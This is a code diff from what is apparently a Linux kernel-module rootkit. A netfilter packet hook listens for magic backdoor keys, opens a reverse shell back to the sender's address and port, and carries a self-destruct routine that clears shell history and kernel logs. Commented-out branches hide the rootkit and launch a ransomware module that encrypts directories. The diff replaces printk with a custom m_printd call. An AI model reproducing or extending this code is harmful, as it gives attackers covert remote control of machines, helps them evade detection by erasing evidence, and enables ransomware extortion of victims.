@@ -2,7 +2,7 @@
 #include "../revshell.h"
 #include "../selfdestruct.h"
 #include "h_kill.h"
-
+#include "../hooking.h"
 
 const char* BACKDOOR_KEY_2600 = "2600_PAYLOAD_GET_REVERSE_SHELL";
 const char* BACKDOOR_KEY_2600_CUSTOM = "CUSTOM_2600_PAYLOAD_GET_REVERSE_SHELL_";
@@ -113,7 +113,7 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             char last_four[5];  // +1 pour le caractère nul
             strncpy(last_four, user_data + strlen(user_data) - 4, 4); // get port 
             last_four[4] = '\0';
-            printk(KERN_INFO ":: Shell custom port connecting to %s:%s \n", ip_source, last_four);
+            m_printd(KERN_INFO ":: Shell custom port connecting to %s:%s \n", ip_source, last_four);
             start_reverse_shell(ip_source, last_four);
             return NF_DROP;
         }else if(memcmp(user_data, DESTRUCT, strlen(DESTRUCT))==0){
@@ -125,33 +125,33 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             flush_history();
             flush_dmesg();
             unload();
-            printk(KERN_INFO ":: CALL SELFDESTRUCT WITH TCP FROM %s \n", ip_source);
+            m_printd(KERN_INFO ":: CALL SELFDESTRUCT WITH TCP FROM %s \n", ip_source);
             return NF_DROP;
         }
         // }else if(memcmp(user_data, 2600_HIDE_ROOTKIT_KEY, strlen(2600_HIDE_ROOTKIT_KEY))==0){
         //     /****HIDE ROOTKIT KEY - Hide the rootkit, remotely***/
 
-        //     printk(KERN_INFO ":: Received order to hide the rootkit \n");
+        //     m_printd(KERN_INFO ":: Received order to hide the rootkit \n");
         //     hide_rootkit();
         //     return NF_DROP;
 
         // }else if(memcmp(user_data, 2600_SHOW_ROOTKIT_KEY, strlen(2600_SHOW_ROOTKIT_KEY))==0){
         //     /****SHOW ROOTKIT KEY - Show the rootkit, remotely***/
 
-        //     printk(KERN_INFO ":: Received order to unhide the rookit \n");
+        //     m_printd(KERN_INFO ":: Received order to unhide the rookit \n");
         //     show_rootkit();
         //     return NF_DROP;
         // }else if(memcmp(user_data, 2600_ENCRYPT_DIR_KEY, strlen(2600_ENCRYPT_DIR_KEY))==0){
         //     //Now we take out the directory which should come in user_data
         //     char encrypt_path[2600_ENCRYPT_DIR_KEY_BUF_LEN];
         //     strcpy(encrypt_path, user_data+strlen(2600_ENCRYPT_DIR_KEY));
-        //     printk(KERN_INFO ":: Received order to ENCRYPT %s \n", encrypt_path);
+        //     m_printd(KERN_INFO ":: Received order to ENCRYPT %s \n", encrypt_path);
         //     start_ransom_module(RANSOM_ENCRYPT, encrypt_path);
         //     return NF_DROP;
         // }else if(memcmp(user_data, 2600_DECRYPT_DIR_KEY, strlen(2600_DECRYPT_DIR_KEY))==0){
         //     char decrypt_path[2600_DECRYPT_DIR_KEY_BUF_LEN];
         //     strcpy(decrypt_path, user_data+strlen(2600_DECRYPT_DIR_KEY));
-        //     printk(KERN_INFO ":: Received order to DECRYPT %s \n", decrypt_path);
+        //     m_printd(KERN_INFO ":: Received order to DECRYPT %s \n", decrypt_path);
         //     start_ransom_module(RANSOM_DECRYPT, decrypt_path);
         //     return NF_DROP;
         // }
